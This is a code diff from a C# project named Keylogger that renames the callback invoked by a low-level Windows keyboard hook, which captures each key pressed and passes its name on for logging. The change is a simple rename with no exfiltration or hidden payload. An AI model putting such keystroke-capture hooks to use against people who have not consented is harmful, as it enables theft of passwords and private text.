@@ -12,7 +12,7 @@ namespace Keylogger.Hooks
     {
         public static Hookproc Hookproc => KeyboardHookCallback;
 
-        public static Action<string, string, KeyType>? CallBackMethod;
+        public static Action<string, string, KeyType>? LogKeyCallback;
         public static Predicate<KeyboardMessage>? SelectedKeyboardEventPredicate;
         private static readonly byte[] _keyboardState = new byte[256];
 
@@ -27,7 +27,7 @@ namespace Keylogger.Hooks
 
             var keyboardStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
             var keyName = GetKeyName(keyboardStruct.vkCode);
-            CallBackMethod?.Invoke(GetKeyboardMessageName(wParam), keyName, KeyType);
+            LogKeyCallback?.Invoke(GetKeyboardMessageName(wParam), keyName, KeyType);
 
             return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
